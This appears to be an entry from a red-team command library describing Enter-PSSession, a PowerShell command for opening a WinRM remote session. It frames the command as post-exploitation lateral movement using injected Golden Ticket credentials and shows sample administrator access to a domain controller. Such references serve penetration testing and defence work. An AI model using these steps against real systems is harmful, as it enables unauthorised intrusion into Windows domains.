---
id: 38405062-48cc-41f4-a7be-44f830a58308
name: enter-pssession-spawn-winrm-session
type: command
executor: powershell
data: Enter-PSSession -ComputerName $_TARGET
output: >-
  PS C:\Windows\system32\spool\drivers\color> Enter-PSSession
  dc-dev.dev.tesla.local

  [dc-dev.dev.tsla.local]: PS C:\Users\Administrator\Documents>
created_at: '2020-07-07T04:30:50.322541+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - winrm
  - remote-access
  - lateral-movement
verified: true
validated: true
---

# enter-pssession-spawn-winrm-session

## Command

```powershell
Enter-PSSession -ComputerName $_TARGET
```

## Description

This PowerShell command initiates an interactive remote session via WinRM on the specified target, using current credentials (e.g., injected Golden Ticket). Ideal for post-exploitation lateral movement to execute commands on remote Windows systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -ComputerName $_TARGET | Hostname or IP of the remote system | Yes |

## Examples

### Basic Remote Session

```powershell
Enter-PSSession -ComputerName dc-dev.dev.tesla.local
```

### With Credentials (If Needed)

```powershell
Enter-PSSession -ComputerName $_TARGET -Credential (Get-Credential)
```

## Expected Output

Prompt changes to the remote session indicator (e.g., [target]: PS C:\Path> ), allowing command execution on the remote host.

## Related

- [[procedures/Create-Golden-Ticket-and-Launch-Windows-Shell]]
